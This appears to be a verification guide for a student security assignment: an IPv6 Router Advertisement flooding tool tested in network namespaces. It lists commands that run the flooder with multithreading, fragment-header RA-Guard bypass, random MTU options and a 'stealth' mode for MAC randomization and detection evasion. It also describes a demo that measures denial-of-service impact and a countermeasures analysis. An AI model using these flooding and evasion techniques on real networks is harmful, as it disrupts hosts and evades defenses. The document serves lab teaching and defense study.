# Verification Guide

This document provides step-by-step verification procedures for each assignment requirement.

## Setup Prerequisites

### 1. Environment Preparation
```bash
# Clone the project
cd "IPv6-Router-Advertisement-RA-Flooding"

# Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

### 2. Root Privileges
Most verifications require root access for raw socket operations:
```bash
sudo -E ./demo.sh  # -E preserves virtual environment
```

## Requirement Verification

### A. IPv6 Router Advertisement Packet Construction
**Verify**: Proper ICMPv6 Type 134 packet creation

```bash
# Test basic packet construction
python3 src/ra_flood.py -i lo -c 1 --capture

# Verify in Wireshark:
# 1. Open generated capture file
# 2. Filter: icmp6.type == 134
# 3. Check packet structure:
#    - Ethernet header present
#    - IPv6 header with correct fields  
#    - ICMPv6 Type 134 (Router Advertisement)
#    - Prefix Information Option with random network
```

**Expected Result**: Valid RA packets with proper protocol stack

### B. Customizable Network Parameters
**Verify**: Interface and count parameter functionality

```bash
# Test different interfaces
python3 src/ra_flood.py -i eth0 -c 10
python3 src/ra_flood.py -i wlan0 -c 50

# Test various packet counts
python3 src/ra_flood.py -i lo -c 1
python3 src/ra_flood.py -i lo -c 100
python3 src/ra_flood.py -i lo -c 1000

# Verify help output
python3 src/ra_flood.py --help
```

**Expected Result**: Different interfaces work, packet count matches sent packets

### C. Multi-threaded Packet Transmission
**Verify**: Concurrent packet sending performance

```bash
# Single-threaded baseline
time python3 src/ra_flood.py -i lo -c 100

# Multi-threaded performance
time python3 src/ra_flood.py -i lo -c 100 --threads 4

# Compare performance metrics
python3 src/ra_flood.py -i lo -c 500 --threads 1 --fast
python3 src/ra_flood.py -i lo -c 500 --threads 4 --fast
```

**Expected Result**: Multi-threaded mode significantly faster than single-threaded

### D. IPv6 Fragment Header Support
**Verify**: Fragment header bypass capability

```bash
# Generate fragmented RA packets
python3 src/ra_flood.py -i lo -c 10 --fragment --capture

# Analyze in Wireshark:
# 1. Filter: ipv6.nxt == 44
# 2. Check for IPv6 Fragment Headers
# 3. Verify ICMPv6 payload follows fragment header
# 4. Confirm fragment offset and more fragments flag
```

**Expected Result**: Packets contain IPv6 Fragment Headers before ICMPv6

### E. Random MTU Advertisement Options
**Verify**: Variable MTU options in RA packets

```bash
# Generate RA packets with random MTU
python3 src/ra_flood.py -i lo -c 20 --random-mtu --capture

# Analyze in Wireshark:
# 1. Filter: icmp6.type == 134
# 2. Expand ICMPv6 options
# 3. Look for MTU Option (Type 5)
# 4. Verify MTU values are random (1280-9000 range)
```

**Expected Result**: RA packets contain MTU options with varying values

### F. Progress Monitoring
**Verify**: Real-time progress indication

```bash
# Test progress bars with different counts
python3 src/ra_flood.py -i lo -c 100
python3 src/ra_flood.py -i lo -c 500 --threads 4

# Verify console output shows:
# - Progress percentage
# - Packet count
# - Packets per second rate
# - Time remaining estimate
```

**Expected Result**: Clear progress indication with packet/second metrics

### G. Network Interface Discovery
**Verify**: Automatic interface detection

```bash
# Test interface discovery utility
python3 -c "
from src.utils import get_interfaces
interfaces = get_interfaces()
print('Available interfaces:')
for iface in interfaces:
    print(f'  - {iface}')
"

# Compare with system interfaces
ip link show
```

**Expected Result**: Python function returns same interfaces as system

### H. Demo Artefacts Generation
**Verify**: Comprehensive demonstration with evidence

```bash
# Run complete demonstration
sudo -E ./demo.sh

# Verify generated files:
ls -la demo_results/
# Should contain:
# - ra_flood_capture.pcap (packet capture)
# - addr_count.csv (address timeline)
# - attack_impact_report.txt (analysis)

# Verify measurable impact:
# - Initial vs final IPv6 address count
# - Growth percentage > 100%
# - Evidence of address explosion
```

**Expected Result**: Demo shows measurable DoS impact with evidence files

### I. Counter-measures Analysis (Bonus)
**Verify**: Defense mechanism testing

```bash
# Run counter-measures demo
sudo ./demo_countermeasures.sh

# Verify test results:
# 1. RA-Guard bypass testing
# 2. ip6tables filter effectiveness  
# 3. Rate limiting impact
# 4. Before/after comparison data
```

**Expected Result**: Analysis shows defense limitations and bypass methods

### J. Stealth Mode Operation (Bonus)
**Verify**: Enhanced evasion capabilities

```bash
# Test stealth mode
python3 src/ra_flood.py -i lo -c 50 --stealth --capture

# Analyze traffic characteristics:
# 1. Source MAC address randomization
# 2. Timing variation between packets
# 3. Legitimate-looking traffic patterns
# 4. Detection evasion effectiveness
```

**Expected Result**: Traffic appears less suspicious and more legitimate

## Integration Testing

### Full Attack Scenario
**Verify**: Complete attack chain functionality

```bash
# Run comprehensive attack test
sudo -E ./demo.sh

# Verification checklist:
# ✅ Network namespace isolation working
# ✅ Victim properly configured for RA acceptance
# ✅ Attack packets transmitted successfully
# ✅ IPv6 addresses created on victim
# ✅ Fragment bypass working
# ✅ Multi-threading performance gains
# ✅ Evidence collection complete
# ✅ Impact analysis accurate
```

### Performance Validation
**Verify**: Performance meets requirements

```bash
# Single-threaded performance test
time python3 src/ra_flood.py -i lo -c 100
# Expected: 30-50 packets/second

# Multi-threaded performance test  
time python3 src/ra_flood.py -i lo -c 400 --threads 4 --fast
# Expected: 100+ packets/second

# Memory usage test
python3 -c "
import psutil, os
from src.ra_flood import RAFlooder
process = psutil.Process(os.getpid())
print(f'Memory before: {process.memory_info().rss / 1024 / 1024:.2f} MB')
# Run attack simulation
print(f'Memory after: {process.memory_info().rss / 1024 / 1024:.2f} MB')
"
```

## Troubleshooting Common Issues

### Permission Errors
```bash
# Ensure running with root privileges
sudo -E python3 src/ra_flood.py -i eth0 -c 10

# Check interface exists and is up
ip link show
sudo ip link set eth0 up
```

### Missing Dependencies
```bash
# Reinstall requirements
pip install -r requirements.txt

# Check specific imports
python3 -c "import scapy.all, tqdm, colorlog; print('All dependencies OK')"
```

### Network Issues
```bash
# Verify IPv6 support
sudo sysctl net.ipv6.conf.all.disable_ipv6
# Should be 0 (enabled)

# Check interface IPv6 configuration
ip -6 addr show
```

### Performance Issues
```bash
# Check system resources
htop

# Monitor network interface
sudo iftop -i eth0

# Verify packet transmission
sudo tcpdump -i eth0 icmp6
```

## Verification Checklist

- [ ] **A. Packet Construction**: RA packets properly formatted
- [ ] **B. Parameter Customization**: Interface and count work correctly  
- [ ] **C. Multi-threading**: Performance improvement verified
- [ ] **D. Fragment Headers**: Bypass capability confirmed
- [ ] **E. Random MTU**: Variable MTU options present
- [ ] **F. Progress Monitoring**: Real-time feedback working
- [ ] **G. Interface Discovery**: Automatic detection functional
- [ ] **H. Demo Artefacts**: Measurable impact demonstrated
- [ ] **I. Counter-measures**: Defense analysis complete (bonus)
- [ ] **J. Stealth Mode**: Evasion capabilities verified (bonus)

## Success Criteria

### Functional Success
- All 10 requirements implemented and verified
- Attack demonstrates measurable DoS impact
- Evidence collection proves effectiveness
- No critical errors during execution

### Quality Success  
- Code runs without crashes
- Performance meets specified targets
- Documentation is clear and complete
- Demo is professional and comprehensive

### Innovation Success
- Advanced techniques implemented
- Creative solutions to technical challenges
- Professional presentation quality
- Practical security insights demonstrated
